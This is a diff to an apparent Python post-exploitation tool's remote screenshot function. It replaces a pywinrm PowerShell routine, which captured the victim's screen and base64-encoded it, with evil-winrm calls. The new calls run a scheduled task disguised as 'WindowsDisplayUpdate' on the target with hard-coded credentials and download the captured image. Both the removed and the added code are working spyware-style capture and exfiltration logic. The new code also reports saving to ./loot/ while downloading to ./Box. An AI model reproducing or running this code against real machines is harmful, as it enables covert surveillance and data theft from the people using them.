@@ -4,7 +4,6 @@ import socket
 import getpass
 import platform
 import base64
-import winrm
 from datetime import datetime
 
 BANNER = r"""
@@ -94,42 +93,35 @@ def check_connection(target_ip, timeout=3):
     return target_ip
 
 def screenshot(target_ip):
-    print("[*] Taking screenshot...")
+    print("[*] Triggering screenshot task...")
 
-    session = winrm.Session(
-        target_ip,
-        auth=(USERNAME, PASSWORD),
-        transport='ntlm'
-    )
+    try:
+        TASK_NAME = "WindowsDisplayUpdate"
+        REMOTE_FILE = "C:\\Users\\Public\\screen.png"
+        LOCAL_DIR = "./Box"
+        cmd = [
+            EVIL_WINRM,
+            "-i", target_ip,
+            "-u", USERNAME,
+            "-p", PASSWORD,
+            "-c", f'schtasks /run /tn "{TASK_NAME}"'
+        ]
+        subprocess.run(cmd, stdout=subprocess.DEVNULL)
 
-    ps_script = r'''
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
+        time.sleep(3)  # give task time to write file
 
-    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-
-    $ms = New-Object System.IO.MemoryStream
-    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
-    $bytes = $ms.ToArray()
-    [Convert]::ToBase64String($bytes)
-    '''
-
-    result = session.run_ps(ps_script)
-
-    if result.status_code != 0:
-        print("[-] Screenshot failed")
-        return
-    
-    img_data = base64.b64decode(result.std_out)
-
-    filename = f"screenshot_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-    with open(filename, "wb") as f:
-        f.write(img_data)
-    
-    print(f"[+] Screenshot saved: {filename}")
+        print("[*] Downloading screenshot...")
+        cmd = [
+            EVIL_WINRM,
+            "-i", target_ip,
+            "-u", USERNAME,
+            "-p", PASSWORD,
+            "-c", f'download {REMOTE_FILE} {LOCAL_DIR}'
+        ]
+        subprocess.run(cmd)
+        print("[+] Screenshot saved to ./loot/")
+    except:
+        print("[-] Failed to save screenshot")
 
 
 def cli():
